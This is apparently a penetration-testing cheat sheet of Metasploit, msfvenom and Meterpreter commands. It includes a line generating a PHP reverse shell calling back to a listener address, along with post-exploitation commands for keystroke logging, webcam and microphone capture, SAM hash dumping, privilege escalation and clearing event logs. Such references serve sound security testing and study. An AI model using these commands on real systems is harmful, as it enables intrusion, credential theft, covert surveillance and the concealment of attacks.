# Metasploit Framework Commands

exit # Exit msfconsole
ls # List contents directories
use <exploit> # Specify an exploit to use
back # leave a context
info # Get detailed info on module within its context
set <param_name> <value> # setting parameter and values
set rhosts <target-ip> # set rhosts parameter to target
unset <param> # Unset a specific parameter 
unset all # Unset all parameters
setg <param> # Set global parameter (Works across different context)
unsetg <param> # Unset a global parameter
exploit # once all params are set, you can exploit the target
exploit -z # -z command will run the exploit and background the session as soon as it opens.
sessions -l # List all sessions
sessions -i <session-id> # Interact with specific session in the meterpreter
show payloads# Show Payloads Compatible with a Module
set payload <payload_name> # Set a Payload
check # Check if a target is vulnerable
save # Save current configuration
show auxiliary # Show auxiliary modules
use auxiliary/<module_name> # Use Auxiliary Module
run # Run Auxiliary Module
db_connect # Connect to the Database:
db_nmap <target> # Store results in the database
hosts # View stored hosts
services # View stored services
search portscan # List port scanning modules
db_status # Check the database status 
workspace # List availables workspaces
workspace -a <workspace_name> # Add a workspace
workspace -d <workspace_name> # Delete a workspace


# =========
# MSF Venom
# =========

msfvenom -l payloads # List msfvenom payloads
msfvenom --list format # List supported output formats
msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > # Generating a Reverse Shell
msfvenom --list payloads | grep meterpreter # List all meterpreter payloads


# ===========
# Meterpreter
# ===========

# Getting a meterpreter session
use post/multi/manage/shell_to_meterpreter
sessions -l # List sessions
set SESSION <id-of session>
run
session -i <New-meterpeter-session>

# Core Commands

background # Backgrounds the current session
exit # Terminate the Meterpreter session
guid # Get the session GUID (Globally Unique Identifier)
help # Displays the help menu
info # Displays information about a Post module
irb # Opens an interactive Ruby shell on the current session
load # Loads one or more Meterpreter extensions
migrate # Allows you to migrate Meterpreter to another process
run # Executes a Meterpreter script or Post module
sessions # Quickly switch to another session

# File System Commands

cd # Will change directory
ls # Will list files in the current directory (dir will also work)
pwd # Prints the current working directory
edit # will allow you to edit a file
cat # Will show the contents of a file to the screen
rm # Will delete the specified file
search # Will search for files
upload # Will upload a file or directory
download # Will download a file or directory

# Networking commands

arp # Displays the host ARP (Address Resolution Protocol) cache
ifconfig # Displays network interfaces available on the target system
netstat # Displays the network connections
portfwd # Forwards a local port to a remote service
route # Allows you to view and modify the routing table

# System commands

clearev # Clears the event logs
execute # Executes a command
getpid # Shows the current process identifier
getuid # Shows the user that Meterpreter is running as
kill # Terminates a process
pkill # Terminates processes by name
ps # Lists running processes
reboot # Reboots the remote computer
shell # Drops into a system command shell
shutdown # Shuts down the remote computer
sysinfo # Gets information about the remote system, such as OS

# Other Commands

idletime # Returns the number of seconds the remote user has been idle
keyscan_dump # Dumps the keystroke buffer
keyscan_start # Starts capturing keystrokes
keyscan_stop # Stops capturing keystrokes
screenshare # Allows you to watch the remote user's desktop in real time
screenshot # Grabs a screenshot of the interactive desktop
record_mic # Records audio from the default microphone for X seconds
webcam_chat # Starts a video chat
webcam_list # Lists webcams
webcam_snap # Takes a snapshot from the specified webcam
webcam_stream # Plays a video stream from the specified webcam
getsystem # Attempts to elevate your privilege to that of local system
hashdump # Dumps the contents of the SAM database



